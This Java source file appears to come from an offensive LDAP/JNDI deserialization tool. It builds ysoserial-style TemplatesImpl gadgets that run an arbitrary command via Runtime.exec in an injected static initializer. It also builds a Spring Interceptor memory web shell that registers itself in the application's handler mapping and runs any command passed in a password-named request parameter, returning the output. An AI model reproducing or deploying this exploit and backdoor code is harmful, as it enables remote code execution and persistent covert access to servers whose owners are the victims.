package com.idiot9.ldap.gadgets.utils;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.xml.transform.Templates;
import java.io.Serializable;

public class TemplatesCreator {
    public static class StubTransletPayload extends AbstractTranslet implements Serializable, HandlerInterceptor {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    command,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    //在这里添加各种内存马
    public static class MemShell{
        //添加内存马后需要在这里增加case
        public static Templates createMemTemplates(String mem, String password) throws Exception {
            Templates templates = null;
            switch(mem){
                case "SpringInterceptor":
                    templates = createTemplatesImplBySpringInterceptorShell(password, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
            }
            return templates;
        }


        public static Templates createTemplatesImplBySpringInterceptorShell(String password, Class tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
            Templates tpl = (Templates) tplClass.newInstance();

            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TemplatesCreator.StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
            pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
            pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
            pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
            pool.importPackage("javax.servlet.http");
            pool.importPackage("javax.servlet");
            pool.importPackage("java.io");
            pool.importPackage("org.springframework.web.context.request");

            CtClass ctClass = pool.get(TemplatesCreator.StubTransletPayload.class.getName());

            CtMethod preHandle = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
                    "        try {\n" +
                    "            PrintWriter writer = response.getWriter();\n" +
                    "            String arg0 = request.getParameter(\"" + password + "\");\n" +
                    "            if (arg0 != null) {\n" +
                    "                String o = \"\";\n" +
                    "                ProcessBuilder p;\n" +
                    "                if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
                    "                    p = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
                    "                } else {\n" +
                    "                    p = new ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
                    "                }\n" +
                    "                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
                    "                o = c.hasNext() ? c.next() : o;\n" +
                    "                c.close();\n" +
                    "                writer.write(o);\n" +
                    "                writer.flush();\n" +
                    "                writer.close();\n" +
                    "            }\n" +
                    "            return false;\n" +
                    "        } catch (IOException e) {\n" +
                    "            throw new RuntimeException(e);\n" +
                    "        }\n" +
                    "    }", ctClass);
            ctClass.addMethod(preHandle);


            String static_block = "try {\n" +
                    "            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
                    "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\");\n" +
                    "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                    "            field.setAccessible(true);\n" +
                    "            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);\n" +
                    "            tmp.BadInterceptor_within aaa = new tmp.BadInterceptor_within();\n" +
                    "            adaptedInterceptors.add(aaa);\n" +
                    "            System.out.println(\"Interceptor has been added\");\n" +
                    "        }catch (java.lang.Exception e){}";

            ctClass.makeClassInitializer().insertAfter(static_block);

            ctClass.setName("tmp.BadInterceptor_within");


            CtClass superClass = pool.get(abstTranslet.getName());
            ctClass.setSuperclass(superClass);


            byte[] classBytes = ctClass.toBytecode();

            Reflections.setFieldValue(tpl, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(TemplatesCreator.Foo.class)});
            Reflections.setFieldValue(tpl, "_name", "pwnr");
            Reflections.setFieldValue(tpl, "_tfactory", transFactory.newInstance());

            return tpl;
        }
    }
}
